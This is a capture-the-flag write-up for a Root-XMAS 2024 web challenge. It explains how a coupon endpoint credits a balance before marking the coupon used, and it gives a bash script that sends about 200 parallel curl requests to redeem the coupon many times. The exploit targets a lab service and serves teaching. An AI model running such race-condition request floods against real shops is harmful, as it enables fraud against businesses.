---
title: Root-XMAS 2024 Day 10 - Route-Mi Shop
feed: hide
permalink: /RootXMAS_2024_10
date: 10-12-2024
summary: A use-once coupon. let's go shopping!
---
### summary

A web challenge with a race condition allowing to apply multiple times a discount voucher.
### recon

We have a nice shop, with a 50€ flag. We can create an account, and we get a 5€ welcome voucher. 
The coupon is showed on our account page, and we can click on a button to redeem it.
However there is no other way to add money to our account, so it's not enough to get the flag! 

![[rmxmas24d10_shop.png| a shop with cheap items]]

![[rmxmas24d10_coupon.png|nice a coupon!]]

We have the sources, so let's check them out!

```js
@app.route('/discount', methods=['POST'])
@login_required
def discount():
    user = User.query.get(session['user_id'])
    coupon_code = request.form.get('coupon_code')

    coupon = Coupon.query.filter_by(user_id=user.id, code=coupon_code).first()
```

Oh no, the coupon is tied to the account, we cannot create multiple ones to redeem the coupon to a single account! What do?
### solution

Let's investigate further our `/discount` route...

```js
@app.route('/discount', methods=['POST'])
	...
	balance = int(user.balance)
    if coupon:
        if not coupon.used:
            balance += 5.0
            user.balance = balance
            db.session.commit()

            anti_bruteforce(2)

            coupon.used = True
            user.can_use_coupon = False
            db.session.commit()
            flash("Your account has been credited with 5€ !")
			...

def anti_bruteforce(time):
	return sleep(time)
```

Wait, so the code credits our account, sleeps 2 seconds and *then* invalidate the coupon? smells like a race condition!

Now you have multiple solutions, you can brute-force with Burp/Zap/Caido . 
Strangely I could not manage to have 10 requests done in 2 seconds with Zap and Caido. Maybe there is an overhead or I missed some parameter.
So let's do it with a simple bash script:

```bash
#!/bin/env bash

cookie="eyJ1c2V..." # get from browser devtools
coupon_code="6283860a-..."

for i in {00..200}
do
    curl -k 'https://day10.challenges.xmas.root-me.org/discount' -X POST \
	-H 'Content-Type: application/x-www-form-urlencoded' \ 
	-H "Cookie: session=$cookie" 
	--data-raw "coupon_code=$coupon_code" & 
	# don't forget the '&' to paralellize!
done
```

Strangely, I had to test the script 2-3 times, as sometimes it only managed to redeem the coupon 5 or 7 times, when we needed 10 to buy the flag.
There must be a more efficient and reliable way to send multiple requests in parallel. Maybe with a script in python or Rust creating threads, the [Portswigger documentation on Race conditions](https://portswigger.net/web-security/race-conditions) also talks about warming up requests.

I also met someone who solved the challenge withe the advanced technique of... spamming the redeem button with his mouse! A  `Cookie Clicker` pro player I guess, and his technique worked very well. Sometimes the challs are that simple ^^'

Race conditions are real, most of the time not as obvious as this challenge, but it's often easy to find some in the wild!


| Previous day | [[Day 09 - The Christmas Thief]] |
| ------------ | -------------------------------- |
| Next day     | [[Day 11 - Padoru]]              |